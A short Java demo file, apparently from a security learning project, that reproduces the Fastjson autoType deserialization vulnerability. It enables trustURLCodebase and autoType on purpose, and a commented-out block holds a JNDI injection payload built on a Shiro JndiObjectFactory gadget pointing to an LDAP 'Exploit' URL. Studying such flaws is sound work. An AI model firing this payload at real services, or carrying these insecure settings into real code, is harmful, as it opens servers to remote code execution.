package cn.segema.learn.safe.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @description fastjson复现漏洞
 * @author wangyong
 * @createDate 2020/08/21
 */
public class FastJsonDemo {

    public static void main(String[] args) {
        // UserDomain userDomain = new UserDomain();
        // JSON.toJSON(userDomain);
        // JSON.parseObject("");
        // JSON.parse("");

        // //test1
        // System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        // ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //
        // String payload =
        // "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
        // JSON.parseObject(payload);

        
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        Object obj = JSON.parse(
            "{\"@type\":\"cn.segema.learn.safe.fastjson.UserDomain\",\"name\":\"test name\", \"age\":\"test age\"}");
        System.out.println(obj);
        System.out.println("------------");
        Object obj2 = JSON.parseObject(
            "{\"@type\":\"cn.segema.learn.safe.fastjson.UserDomain\",\"name\":\"test name\", \"age\":\"test age\"}");
        System.out.println(obj2);

    }
}
